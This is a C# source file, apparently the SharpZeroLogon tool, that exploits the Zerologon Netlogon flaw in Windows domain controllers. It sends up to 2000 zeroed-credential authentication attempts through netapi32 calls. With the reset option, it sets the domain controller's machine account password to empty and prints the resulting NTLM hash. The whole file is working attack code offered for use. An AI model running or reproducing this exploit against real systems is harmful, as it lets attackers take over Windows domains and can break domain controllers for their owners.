using System;
using System.Runtime.InteropServices;
using static SharpZeroLogon.Netapi32;

namespace SharpZeroLogon
{
    class Netapi32
    {
        public enum NETLOGON_SECURE_CHANNEL_TYPE : int
        {
            NullSecureChannel = 0,
            MsvApSecureChannel = 1,
            WorkstationSecureChannel = 2,
            TrustedDnsDomainSecureChannel = 3,
            TrustedDomainSecureChannel = 4,
            UasServerSecureChannel = 5,
            ServerSecureChannel = 6
        }

        [StructLayout(LayoutKind.Explicit, Size = 516)]
        public struct NL_TRUST_PASSWORD
        {
            [FieldOffset(0)]
            public ushort Buffer;

            [FieldOffset(512)]
            public uint Length;
        }

        [StructLayout(LayoutKind.Explicit, Size = 12)]
        public struct NETLOGON_AUTHENTICATOR
        {
            [FieldOffset(0)]
            public NETLOGON_CREDENTIAL Credential;

            [FieldOffset(8)]
            public uint Timestamp;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct NETLOGON_CREDENTIAL
        {
            public sbyte data;
        }

        [DllImport("netapi32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        public static extern int I_NetServerReqChallenge(
            string PrimaryName,
            string ComputerName,
            ref NETLOGON_CREDENTIAL ClientChallenge,
            ref NETLOGON_CREDENTIAL ServerChallenge
            );

        [DllImport("netapi32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        public static extern int I_NetServerAuthenticate2(
            string PrimaryName,
            string AccountName,
            NETLOGON_SECURE_CHANNEL_TYPE AccountType,
            string ComputerName,
            ref NETLOGON_CREDENTIAL ClientCredential,
            ref NETLOGON_CREDENTIAL ServerCredential,
            ref ulong NegotiateFlags
            );

        [DllImport("netapi32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        public static extern int I_NetServerPasswordSet2(
            string PrimaryName,
            string AccountName,
            NETLOGON_SECURE_CHANNEL_TYPE AccountType,
            string ComputerName,
            ref NETLOGON_AUTHENTICATOR Authenticator,
            out NETLOGON_AUTHENTICATOR ReturnAuthenticator,
            ref NL_TRUST_PASSWORD ClearNewPassword
            );
    }

    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine(" Usage: SharpZeroLogon.exe <target dc fqdn> <reset: true/false>");
                return;
            }

            bool reset = false;
            string fqdn = args[0];
            string hostname = fqdn.Split('.')[0];

            if (args.Length == 2 && args[1] == "true")
                reset = true;

            NETLOGON_CREDENTIAL ClientChallenge = new NETLOGON_CREDENTIAL();
            NETLOGON_CREDENTIAL ServerChallenge = new NETLOGON_CREDENTIAL();
            ulong NegotiateFlags = 0x212fffff;

            Console.WriteLine("Performing authentication attempts...");

            for (int i = 0; i < 2000; i++)
            {
                if (I_NetServerReqChallenge(fqdn, hostname, ref ClientChallenge, ref ServerChallenge) != 0)
                {
                    Console.WriteLine("Unable to complete server challenge. Possible invalid name or network issues?");
                    return;
                }
                Console.Write("=");

                if (I_NetServerAuthenticate2(fqdn, hostname + "$", NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
                    hostname, ref ClientChallenge, ref ServerChallenge, ref NegotiateFlags) == 0)
                {
                    Console.WriteLine("\nSuccess! DC can be fully compromised by a Zerologon attack.");

                    NETLOGON_AUTHENTICATOR authenticator = new NETLOGON_AUTHENTICATOR();
                    NL_TRUST_PASSWORD ClearNewPassword = new NL_TRUST_PASSWORD();

                    if (reset)
                    {
                        if (I_NetServerPasswordSet2(
                            fqdn,
                            hostname + "$",
                            NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
                            hostname,
                            ref authenticator,
                            out _,
                            ref ClearNewPassword
                            ) == 0)
                        {
                            Console.WriteLine("Done! Machine account password set to NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0");
                            return;
                        }
                        Console.WriteLine("Failed to reset machine account password");
                    }

                    return;
                }
            }
            Console.WriteLine("\nAttack failed. Target is probably patched.");
        }
    }
}